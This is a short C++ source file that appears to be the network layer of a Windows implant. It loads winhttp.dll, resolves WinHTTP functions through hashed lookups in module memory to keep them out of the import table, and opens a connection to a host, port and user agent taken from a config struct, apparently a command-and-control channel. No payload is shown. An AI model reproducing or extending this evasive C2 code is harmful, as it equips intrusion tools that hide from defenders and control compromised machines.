#include <Windows.h>
#include <winhttp.h>
#include <config.h>
#include <iostream>
#include <hashtable.h>
#include <mem_ldr.h>
#include <apidef.h>

extern CONFIG *pg_conf;
int g_timeout;
SOCKET initialize_connection_provider() {
	LoadLibraryW(L"winhttp.dll");
	PUCHAR winhttp = (PUCHAR)MemoryGetModuleHandle(WHASH_winhttp);
	pfnWinHttpOpen fnWinHttpOpen = (pfnWinHttpOpen)MemoryGetProcAddressP(winhttp, HASH_WinHttpOpen);
	pfnWinHttpSetTimeouts fnWinHttpSetTimeouts = (pfnWinHttpSetTimeouts)MemoryGetProcAddressP(winhttp, HASH_WinHttpSetTimeouts);
	pfnWinHttpConnect fnWinHttpConnect = (pfnWinHttpConnect)MemoryGetProcAddressP(winhttp, HASH_WinHttpConnect);

	g_timeout = pg_conf->timeout;
	std::wstring ws(pg_conf->useragent, pg_conf->useragent + sizeof(pg_conf->useragent));
	// useragent fix
	HINTERNET hSession = fnWinHttpOpen(ws.c_str(),
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	HINTERNET hConnect = NULL;

	fnWinHttpSetTimeouts(hSession, g_timeout, g_timeout, g_timeout, g_timeout);
	
	// http connect
	ws.assign(pg_conf->host, pg_conf->host + sizeof(pg_conf->host));

	if (hSession)
		hConnect = fnWinHttpConnect(hSession, ws.c_str(),
			pg_conf->port, 0);

	return (SOCKET)hConnect;
}